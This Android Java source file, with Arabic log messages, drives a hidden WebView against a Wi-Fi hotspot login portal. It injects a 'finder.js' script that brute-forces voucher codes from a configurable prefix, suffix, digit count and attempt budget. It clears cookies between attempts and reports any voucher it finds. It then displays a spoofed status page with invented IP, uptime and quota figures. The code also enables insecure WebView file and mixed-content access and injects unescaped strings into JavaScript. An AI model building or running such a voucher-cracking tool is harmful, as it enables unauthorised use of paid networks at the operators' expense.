package com.example.networkbrowserdemo;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends Activity {
    private WebView webView, hiddenWeb;
    private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts, etPause, etRetry, etStatusEvery, etThreads;
    private TextView statusText, logText, voucherResult;
    private SharedPreferences prefs;
    private String finderJs = "";
    private String realNetworkUrl = "http://7.7.7.7/index.html";
    private StringBuilder logBuf = new StringBuilder();
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean logUpdatePending = false;
    private boolean isRunning = false;
    private boolean hiddenInitialized = false;
    
    private String lastVoucher = "---";
    private String lastIp = "---";
    private String lastUptime = "---";
    private String lastRemain = "---";

    @SuppressLint("SetJavaScriptEnabled")
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("finder", MODE_PRIVATE);

        urlBar = findViewById(R.id.urlBar);
        etPrefix = findViewById(R.id.etPrefix);
        etSuffix = findViewById(R.id.etSuffix);
        etDigits = findViewById(R.id.etDigits);
        etAttempts = findViewById(R.id.etAttempts);
        etPause = findViewById(R.id.etPause);
        etRetry = findViewById(R.id.etRetry);
        etStatusEvery = findViewById(R.id.etStatusEvery);
        etThreads = findViewById(R.id.etThreads);
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        voucherResult = findViewById(R.id.voucherResult);
        webView = findViewById(R.id.webView);

        String saved = prefs.getString("url", "");
        if (saved.isEmpty() || saved.equals("http://") || saved.startsWith("file://") || !saved.startsWith("http") || saved.length() < 10) {
            realNetworkUrl = "http://7.7.7.7/index.html";
            prefs.edit().putString("url", realNetworkUrl).apply();
        } else {
            realNetworkUrl = saved;
        }
        urlBar.setText(realNetworkUrl);

        etPrefix.setText(prefs.getString("prefix", "5"));
        etSuffix.setText(prefs.getString("suffix", "31"));
        etDigits.setText(prefs.getString("digits", "7"));
        etAttempts.setText(prefs.getString("attempts", "1000"));
        etPause.setText(prefs.getString("pause", "1000"));
        etRetry.setText(prefs.getString("retry", "1000"));
        etStatusEvery.setText(prefs.getString("statusEvery", "50"));
        etThreads.setText("1");

        try {
            InputStream is = getAssets().open("finder.js");
            byte[] buf = new byte[is.available()];
            is.read(buf); is.close();
            finderJs = new String(buf, StandardCharsets.UTF_8);
        } catch (Exception e) { appendLog("خطأ تحميل JS: " + e.getMessage()); }

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setAllowFileAccess(true);
        s.setAllowFileAccessFromFileURLs(true);
        s.setAllowUniversalAccessFromFileURLs(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView view, String url) {
                if (!url.startsWith("file://")) {
                    urlBar.setText(url);
                }
                if (url.contains("status.html")) {
                    fillStatusPage();
                }
            }
        });

        findViewById(R.id.btnGo).setOnClickListener(v -> {
            String entered = urlBar.getText().toString().trim();
            if (entered.isEmpty() || entered.startsWith("file://")) {
                Toast.makeText(this, "أدخل رابط الشبكة الحقيقية", Toast.LENGTH_LONG).show();
                return;
            }
            if (!entered.startsWith("http")) entered = "http://" + entered;
            realNetworkUrl = entered;
            prefs.edit().putString("url", realNetworkUrl).apply();
            urlBar.setText(realNetworkUrl);
            Toast.makeText(this, "✅ تم حفظ الرابط", Toast.LENGTH_SHORT).show();
            appendLog("✅ رابط الشبكة: " + realNetworkUrl);
        });

        findViewById(R.id.btnFinder).setOnClickListener(v -> {
            View panel = findViewById(R.id.panel);
            panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
        });

        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());

        findViewById(R.id.btnStart).setOnClickListener(v -> startCrack());
        findViewById(R.id.btnStop).setOnClickListener(v -> stopCrack());
        findViewById(R.id.btnClear).setOnClickListener(v -> {
            CookieManager.getInstance().removeAllCookies(null);
            CookieManager.getInstance().flush();
            logBuf.setLength(0);
            logText.setText("");
            voucherResult.setVisibility(View.GONE);
            appendLog("🗑️ تم مسح الكوكيز");
        });

        webView.loadUrl("file:///android_asset/network_source/index.html");
    }

    private void initHiddenWeb() {
        if (hiddenInitialized) return;
        hiddenWeb = new WebView(this);
        WebSettings hs = hiddenWeb.getSettings();
        hs.setJavaScriptEnabled(true);
        hs.setDomStorageEnabled(true);
        hs.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        CookieManager.getInstance().setAcceptThirdPartyCookies(hiddenWeb, true);
        hiddenWeb.addJavascriptInterface(new HiddenBridge(), "AndroidBridge0");
        hiddenInitialized = true;
    }

    private void startCrack() {
        if (realNetworkUrl == null || realNetworkUrl.isEmpty() || realNetworkUrl.startsWith("file://") || realNetworkUrl.equals("http://") || realNetworkUrl.length() < 10) {
            Toast.makeText(this, "❌ الرابط غير صحيح!", Toast.LENGTH_LONG).show();
            return;
        }
        
        isRunning = true;
        initHiddenWeb();
        
        appendLog("🔍 فحص حالة الشبكة أولاً...");
        statusText.setText("جاري فحص الشبكة...");
        voucherResult.setVisibility(View.GONE);
        
        String statusUrl = buildStatusUrl(realNetworkUrl);
        appendLog("📡 " + statusUrl);
        
        hiddenWeb.setWebViewClient(new WebViewClient() {
            boolean processed = false;
            @Override public void onPageFinished(WebView view, String url) {
                if (processed) return;
                processed = true;
                view.evaluateJavascript("(function(){try{return document.body.innerText;}catch(e){return '';}})()", value -> {
                        String body = value != null ? value : "";
                        if (body.startsWith("\"") && body.endsWith("\"")) {
                            body = body.substring(1, body.length() - 1).replace("\\\"", "\"").replace("\\\\", "\\").replace("\\n", " ");
                        }
                        appendLog("📄 الرد: " + (body.length() > 100 ? body.substring(0,100) + "..." : body));
                        
                        String voucher = extractJson(body, "username");
                        String loggedIn = extractJson(body, "logged_in");
                        boolean isActive = loggedIn != null && (loggedIn.equalsIgnoreCase("yes") || loggedIn.equalsIgnoreCase("true") || loggedIn.equals("1"));
                        
                        if (isActive && voucher != null && !voucher.equals("-") && !voucher.equals("N/A")) {
                            final String v = voucher;
                            runOnUiThread(() -> {
                                appendLog("✅ يوجد كرت مسجل: " + v);
                                voucherResult.setText("✅ كرت مسجل: " + v);
                                voucherResult.setVisibility(View.VISIBLE);
                                statusText.setText("✅ كرت مسجل");
                                showStatusPage(v);
                            });
                        } else {
                            runOnUiThread(() -> {
                                appendLog("ℹ لا يوجد كرت مسجل - بدء التخمين...");
                                startRealCrack();
                            });
                        }
                    });
            }
        });
        hiddenWeb.loadUrl(statusUrl);
    }
    
    private String extractJson(String body, String key) {
        try {
            Pattern p = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
            Matcher m = p.matcher(body);
            if (m.find()) return m.group(1);
        } catch (Exception e) {}
        return null;
    }
    
    private String buildStatusUrl(String base) {
        if (base.contains("/login")) return base.replace("/login", "/status?var=callBack");
        if (base.contains("/index.html")) return base.replace("/index.html", "/status?var=callBack");
        if (base.endsWith("/")) return base + "status?var=callBack";
        return base + "/status?var=callBack";
    }
    
    private void startRealCrack() {
        String p = etPrefix.getText().toString().trim();
        String s = etSuffix.getText().toString().trim();
        int d = parseInt(etDigits, 7);
        int a = parseInt(etAttempts, 1000);
        int pz = parseInt(etPause, 1000);
        
        appendLog("🔧 إعداد FINDER_CONFIG...");
        final String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
        
        String crackUrl = realNetworkUrl;
        if (!crackUrl.endsWith("/login") && !crackUrl.contains("index.html") && !crackUrl.contains(".html")) {
            // إذا كان الرابط بدون صفحة، نضيف /login
            if (crackUrl.endsWith("/")) crackUrl = crackUrl + "login";
            else crackUrl = crackUrl + "/login";
        }
        final String finalCrackUrl = crackUrl;
        
        appendLog("🔧 سيتم التخمين على: " + finalCrackUrl);
        appendLog("🔧 طول finder.js: " + finderJs.length() + " حرف");
        
        hiddenWeb.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView view, String url) {
                appendLog("📄 تم تحميل صفحة التخمين: " + url);
                appendLog("🔧 حقن FINDER_CONFIG...");
                view.evaluateJavascript(cfg, value -> {
                    appendLog("✅ تم حقن الإعدادات");
                    appendLog("🔧 حقن finder.js...");
                    view.evaluateJavascript(finderJs, value2 -> {
                        appendLog("✅ تم حقن السكربت - انتظر أول محاولة...");
                    });
                });
            }
        });
        hiddenWeb.loadUrl(finalCrackUrl);
        statusText.setText("جاري التخمين...");
    }
    
    private void fillStatusPage() {
        String js = "(function(){" +
            "var p=new URLSearchParams(window.location.search);" +
            "var v=p.get('voucher')||'" + lastVoucher + "';" +
            "var ip=p.get('ip')||'" + lastIp + "';" +
            "var up=p.get('uptime')||'" + lastUptime + "';" +
            "var rem=p.get('remain')||'" + lastRemain + "';" +
            "var h=document.body.innerHTML;" +
            "h=h.split('$(username)').join(v);" +
            "h=h.split('$(bytes-out-nice)').join(rem);" +
            "h=h.split('$(bytes-in-nice)').join('0 MB');" +
            "h=h.split('$(session-time-left)').join('غير محدود');" +
            "h=h.split('$(uptime)').join(up);" +
            "h=h.split('$(ip)').join(ip);" +
            "h=h.split('$(link-logout)').join('#');" +
            "h=h.split('$(link-status)').join('#');" +
            "h=h.split('$(link-orig)').join('#');" +
            "h=h.split('$(error)').join('');" +
            "document.body.innerHTML=h;" +
            "})()";
        webView.evaluateJavascript(js, null);
    }
    
    private void showStatusPage(String voucher) {
        try {
            lastVoucher = voucher;
            lastIp = "172.16.114.93";
            lastUptime = "1h 30m";
            lastRemain = "5.2 GB";
            String url = "file:///android_asset/network_source/status.html?voucher=" + voucher 
                + "&ip=" + lastIp + "&uptime=" + lastUptime + "&remain=" + lastRemain;
            webView.loadUrl(url);
        } catch (Exception e) {
            appendLog("⚠ خطأ في صفحة الحالة: " + e.getMessage());
        }
    }
    
    private void stopCrack() {
        isRunning = false;
        if (hiddenWeb != null) hiddenWeb.evaluateJavascript("window.stopFinder && window.stopFinder();", null);
        statusText.setText("⏹ تم الإيقاف");
        appendLog("⏹ تم الإيقاف");
    }
    
    private int parseInt(EditText e, int def) {
        try { return Integer.parseInt(e.getText().toString().trim()); } catch (Exception ex) { return def; }
    }
    
    private void appendLog(String msg) {
        logBuf.append(msg).append('\n');
        if (!logUpdatePending) {
            logUpdatePending = true;
            uiHandler.postDelayed(() -> {
                logText.setText(logBuf.toString());
                findViewById(R.id.logScroll).post(() -> ((ScrollView) findViewById(R.id.logScroll)).fullScroll(View.FOCUS_DOWN));
                logUpdatePending = false;
            }, 100);
        }
    }
    
    public class HiddenBridge {
        @JavascriptInterface public void log(String m) { runOnUiThread(() -> appendLog("[H] " + m)); }
        @JavascriptInterface public void progress(int c, int t, String v) { runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v)); }
        @JavascriptInterface public void clearCookies() {
            runOnUiThread(() -> {
                CookieManager.getInstance().removeAllCookies(null);
                CookieManager.getInstance().flush();
            });
        }
        @JavascriptInterface public void found(final String voucher, String st) {
            runOnUiThread(() -> {
                appendLog("✅✅✅ وجد الكرت: " + voucher);
                statusText.setText("✅ وجد الكرت!");
                
                String jsFill = "(function(){ if(window.showVoucherFound) window.showVoucherFound('" + voucher + "'); })();";
                webView.evaluateJavascript(jsFill, null);
                
                voucherResult.setText("✅ الكرت: " + voucher);
                voucherResult.setVisibility(View.VISIBLE);
                Toast.makeText(MainActivity.this, "✅ " + voucher, Toast.LENGTH_LONG).show();
                
                uiHandler.postDelayed(() -> showStatusPage(voucher), 2000);
                stopCrack();
            });
        }
    }
}
